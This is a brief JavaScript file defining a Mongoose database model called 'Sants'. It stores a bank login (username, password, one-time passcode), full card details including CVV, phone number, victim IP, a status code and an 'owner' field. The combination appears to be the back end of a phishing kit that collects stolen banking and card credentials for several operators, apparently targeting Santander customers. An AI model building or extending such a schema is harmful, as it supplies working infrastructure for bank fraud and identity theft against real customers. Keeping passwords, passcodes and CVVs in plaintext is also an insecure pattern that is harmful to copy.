const mongoose = require("mongoose");

const santsSchema = new mongoose.Schema({
    uniqueid: Number,
    username: String,
    password: String,
    otp: String,
    ccname: String,
    ccnum: String,
    ccexp: String,
    cvv: String,
    phone: String,
    status: Number,
    ip: String,
    owner: String,
});

module.exports = mongoose.model("Sants", santsSchema);
